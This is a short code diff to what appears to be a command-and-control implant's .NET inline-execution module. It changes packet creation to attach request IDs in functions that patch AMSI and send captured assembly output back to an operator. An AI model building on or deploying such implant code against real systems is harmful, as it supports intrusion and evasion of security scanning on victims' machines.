@@ -73,7 +73,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     if ( Instance.Session.OSVersion > WIN_VERSION_10 )
     {
         PUTS( "Try to patch amsi" )
-        PackageInfo = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
+        PackageInfo = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
         PackageAddInt32( PackageInfo, DOTNET_INFO_AMSI_PATCHED );
         if ( AmsiPatched == FALSE )
         {
@@ -94,7 +94,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     }
 
     /* Let the operator know what version we are going to use. */
-    PackageInfo = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
+    PackageInfo = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
     PackageAddInt32( PackageInfo, DOTNET_INFO_NET_VERSION );
     PackageAddBytes( PackageInfo, Instance.Dotnet->NetVersion.Buffer, Instance.Dotnet->NetVersion.Length );
     PackageTransmit( PackageInfo, NULL, NULL );
@@ -288,7 +288,7 @@ VOID DotnetPushPipe()
 
             Instance.Win32.ReadFile( Instance.Dotnet->Pipe, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length, &Instance.Dotnet->Output.Length, NULL );
 
-            Package = PackageCreate( DEMON_OUTPUT );
+            Package = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_OUTPUT );
             PackageAddBytes( Package, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length );
             PackageTransmit( Package, NULL, NULL );
 
